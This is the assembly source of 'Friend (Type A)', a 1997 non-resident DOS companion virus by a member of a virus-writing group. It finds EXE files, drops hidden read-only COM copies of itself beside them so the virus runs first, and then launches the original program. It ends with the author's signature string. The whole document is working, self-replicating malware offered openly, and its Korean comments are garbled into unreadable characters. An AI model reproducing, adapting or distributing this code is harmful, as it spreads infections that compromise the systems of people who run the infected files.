;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                                               CVC #02  97/09
; Virus Name : Friend (Type A)
;
; Author : Osiris of CVC,Corea
; Date : 1997/09/05
;
; Type : Non-resident Companion
;
; ���w�� Companion �a����a���a. �e���e �A���� �a�A�A�b�E �e�e�w �a����a���a.
; �e�� ���Bɡ���A�� 1 ���� EXE �a���i �x�a ���� �a���w COM �a���i ����Ё���a.
; ���� EXE �a���i �����a�� �g�a�a�� �A��a �i �a�w���e �᷁ ���a.
;
; á�a�e �����E COM �a���e �b�A�a�e �E�a.
;
; ����A �a�֔� �e�e�w ���e �g�� �i���a.
; �b�� �������w �񬂵A ���e�� �A�� �a���e, �|�a�� �����A�e ���e �������w��
; �A�� ���e�� �e�I �����a.
;
; �w�w ���bΑ�e ����w���a.
;
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 PARASIZE   EQU  (End_Memory-Friend+0Fh) SHR 4 + 13h

            org   100h

 Friend:
            mov   ah,2fh                    ; DTA ���a��
            int   21h
            push  es                        ; DTA �t ��w
            push  bx

            mov   ah,1ah                    ; ������ DTA ���
            mov   dx, offset NewDTA
            int   21h

            mov   ah,4Eh                    ; EXE �a�� �x��
            mov   cx,00100011B              ; ������w/�����a��
            mov   dx, offset Mask_EXE       ;
 Find_repeat:
            int   21h                       ;
            jc    Execute_EXE               ; �q�q ��ǩ �a���� ���a�e EXE ��З

 Infect_EXE:
            mov   si, offset NewDTA + 1Eh   ;
            call  ChgExt                    ; EXE -> COM,COM -> EXE

            mov   ax, 4300h                 ; �q�q �a�� �·�
            mov   dx, offset NewDTA + 1Eh   ; (COM �a���� ���� �a�e�a?)
            int   21h
            jc    Drop_COM                  ; ���� �x�i �� ���a�e �q�q �E����

            mov   ah, 4Fh                   ; �a�q �a�� �x��
            jmp   Find_repeat

 Drop_COM:
            mov   ah, 3ch                   ; COM �a�� ����
            mov   cx, 00000011B             ; �����e �a�w/����
            mov   dx, offset NewDTA + 1Eh
            int   21h

            xchg  ax,bx                     ; Ѕ�i �苡

            mov   ah, 40h                   ; �a����a �a��
            mov   cx, offset End_virus - 100h
            mov   dx, 100h
            int   21h

            mov   ah, 3eh                   ; �a�� �h��
            int   21h

 Execute_EXE:
            pop   dx                        ; ���� DTA ����
            pop   ds
            mov   ah,1ah
            int   21h

            mov   sp, offset End_Memory     ; �aȂ ����

            mov   ah,4ah                    ; �A���� ����
            mov   bx, PARASIZE
            int   21h

            call  Set_env                   ; ���� EXE �a�� ��З�i ���e �ŉw
                                            ; �w�b ���

            mov   si, offset Filename
            call  ChgExt                    ; �¸w�a �e�w

            mov   ax,4b00h                  ; ���� EXE �a�� ��З
            mov   bx, offset Env_Block
            mov   dx, offset Filename
            int   21h

            mov   ah,4dh                    ; ����t �苡
            int   21h
 Stop_virus:
            mov   ax, 4c00h                 ; �a����a �{����
            int   21h

;
; �¸w�a �a���� (EXE -> COM, COM -> EXE)
; ���b SI = �a�����a �a�e �¸w�a

 ChgExt     proc  near                      ; �¸w�a �a����

 Loop_Eof:
            lodsb
            or    al,al
            jnz   Loop_Eof

            mov   di,si
            sub   di,4                      ; DI = �¸w�a ��á
            mov   si, offset Ext_COM        ; SI = COM

            cmp   byte ptr [di],'E'         ; EXE �a�� ���a ?
            jz    mov_ext
            add   si,0005                   ; SI = EXE
 mov_ext:
            mov   cx,0003
            repz  movsb                     ; �¸w�a�a COM ���e EXE ��
                                            ; EXE ���e COM �a�� �a���a.
            ret
 ChgExt     Endp


; �ŵw�w�b�A�� ����З�A ϩ�a�e ���� �苡
;
;
 Set_Env    proc

            mov   PSP1,es
            mov   PSP2,es
            mov   PSP3,es

 Search_RD:                                 ; �a�� ��З�a�� ��Ё�� ϩ�a�e �t�i�i �i�a���a.
            xor   si,si
            mov   ds,ds:[002Ch]             ; ��З��ǥ �a���� ���q�i �i�a���a.

 Search_RD_LOOP:
            cmp   word ptr DS:[SI],0000     ; �a�����q��A�e 0000���a.
            jz    Get_FileName              ; PSP:[002Ch] --> �A�a���a
            inc   si
            jmp   Search_RD_LOOP

 Get_FileName:
            add   si,0004
            mov   dx,si                     ; �e�� ��З�A�e �a�����q

            mov   di, offset Filename
            mov   cx,0080
            repz  movsb

            push  cs                        ;
            pop   ds
            RET

 Set_env    endp

            db    '[Friend] The first Corean Companion virus..'
            db    '(c) 1997/09 Osiris of CVC (Corean Virus Club),Corea'

; ����З�i ���e �i��
 ENV_BLOCK  dw    ?                         ; ����З�w �i��
            dw    80h                       ;
 PSP1       dw    ?
            dw    5ch                       ;
 PSP2       dw    ?
            dw    6ch                       ;
 PSP3       dw    ?

 Ext_COM    db    'COM'                     ; �¸w�a COM
 Mask_EXE   db    '*.EXE',00                ; �¸w�a EXE

 End_Virus:

 Filename   db    85  dup (0)               ; �a�� ���q
 NewDTA     db    50  dup (0)               ; DTA
            db    100 dup (0)               ; �aȂ
 End_Memory:

            END   Friend

